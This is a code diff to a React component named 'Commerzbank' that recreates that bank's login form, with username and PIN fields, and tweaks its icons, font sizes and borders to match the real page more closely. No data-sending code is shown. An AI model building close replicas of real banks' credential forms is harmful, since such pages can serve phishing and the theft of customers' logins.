@@ -17,14 +17,17 @@ const ArrowRight = ({ size = 18, color = GREEN }: { size?: number; color?: strin
 );
 
 const EyeIcon = ({ open }: { open: boolean }) => (
-  <svg width="22" height="22" viewBox="0 0 24 24" fill={GREEN} aria-hidden="true">
+  <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true" style={{ color: GREEN }}>
     {open ? (
+      <>
+        <path d="M8.46 10.18A4 4 0 0 0 12 16Z" />
+        <path d="M12 18.25c-3.46 0-6.93-3.88-8.61-6.25A21.86 21.86 0 0 1 7.1 7.93l-1-1.73A24.69 24.69 0 0 0 1 12s4.92 8.25 11 8.25a7.38 7.38 0 0 0 2.29-.38l-1.06-1.78a5.19 5.19 0 0 1-1.23.16ZM23 12s-4.92-8.25-11-8.25a7.34 7.34 0 0 0-2.46.45L7.61 1 5.89 2l12.5 20.75 1.72-1-2.31-3.84A24.56 24.56 0 0 0 23 12Zm-7.55 2a3.93 3.93 0 0 0 .55-2 4 4 0 0 0-4-4h-.16l-1.23-2A5.09 5.09 0 0 1 12 5.75c3.46 0 6.93 3.88 8.61 6.25a21.71 21.71 0 0 1-3.85 4.18Z" />
+      </>
+    ) : (
       <>
         <path d="M12 3.75C5.92 3.75 1 12 1 12s4.92 8.25 11 8.25S23 12 23 12s-4.92-8.25-11-8.25Zm0 14.5c-3.46 0-6.93-3.88-8.61-6.25C5.07 9.62 8.54 5.75 12 5.75s6.93 3.88 8.61 6.25c-1.68 2.38-5.15 6.25-8.61 6.25Z" />
         <path d="M12 8a4 4 0 1 0 4 4 4 4 0 0 0-4-4Zm0 6a2 2 0 1 1 2-2 2 2 0 0 1-2 2Z" />
       </>
-    ) : (
-      <path d="M2.1 3.51 3.51 2.1 21.9 20.49l-1.41 1.41-3.3-3.3C15.78 19.5 13.94 20 12 20 7 20 2.73 16.89 1 12.5c.77-1.96 2.01-3.67 3.59-5L2.1 3.51ZM12 7c3.86 0 7 3.14 7 7 0 .65-.09 1.27-.26 1.86l-2.14-2.14A5 5 0 0 0 10.28 7.4L8.14 5.26C9.33 5.09 10.65 5 12 5c5 0 9.27 3.11 11 7.5-.73 1.85-1.86 3.48-3.3 4.76L18.11 15.6c.57-.95.89-2.05.89-3.1 0-3.31-2.69-6-6-6-.6 0-1.17.09-1.72.26L9.28 4.82C10.14 4.65 11.05 4.56 12 4.56Z" />
     )}
   </svg>
 );
@@ -135,14 +138,17 @@ const Commerzbank = () => {
               <div className="max-w-[520px]">
                 {/* Username */}
                 <div className="mb-8">
-                  <div className="relative pt-5">
+                  <div
+                    className="relative pt-5 border-b hover:border-b-2 focus-within:border-b-2 pb-[1px] hover:pb-0 focus-within:pb-0"
+                    style={{ borderColor: TEXT }}
+                  >
                     <label
                       htmlFor="cb-user"
                       className="absolute left-0 pointer-events-none transition-all duration-200 ease-out"
                       style={{
                         color: TEXT,
                         top: username || userFocus ? 0 : 22,
-                        fontSize: username || userFocus ? 13 : 16,
+                        fontSize: username || userFocus ? 13 : 17,
                       }}
                     >
                       Benutzername/Teilnehmernummer
@@ -162,22 +168,25 @@ const Commerzbank = () => {
                       onBlur={() => setUserFocus(false)}
                       value={username}
                       onChange={(e) => setUsername(e.target.value)}
-                      className="w-full bg-transparent border-0 border-b py-2 outline-none text-[16px]"
-                      style={{ borderColor: TEXT, color: TEXT }}
+                      className="w-full bg-transparent border-0 py-2 outline-none text-[17px]"
+                      style={{ color: TEXT }}
                     />
                   </div>
                 </div>
 
                 {/* Password */}
                 <div className="mb-10">
-                  <div className="relative pt-5">
+                  <div
+                    className="relative pt-5 border-b hover:border-b-2 focus-within:border-b-2 pb-[1px] hover:pb-0 focus-within:pb-0"
+                    style={{ borderColor: TEXT }}
+                  >
                     <label
                       htmlFor="cb-pin"
                       className="absolute left-0 pointer-events-none transition-all duration-200 ease-out"
                       style={{
                         color: TEXT,
                         top: password || passFocus ? 0 : 22,
-                        fontSize: password || passFocus ? 13 : 16,
+                        fontSize: password || passFocus ? 13 : 17,
                       }}
                     >
                       Passwort/PIN
@@ -197,8 +206,8 @@ const Commerzbank = () => {
                       onBlur={() => setPassFocus(false)}
                       value={password}
                       onChange={(e) => setPassword(e.target.value)}
-                      className="w-full bg-transparent border-0 border-b py-2 pr-10 outline-none text-[16px]"
-                      style={{ borderColor: TEXT, color: TEXT }}
+                      className="w-full bg-transparent border-0 py-2 pr-10 outline-none text-[17px]"
+                      style={{ color: TEXT }}
                     />
                     <button
                       type="button"
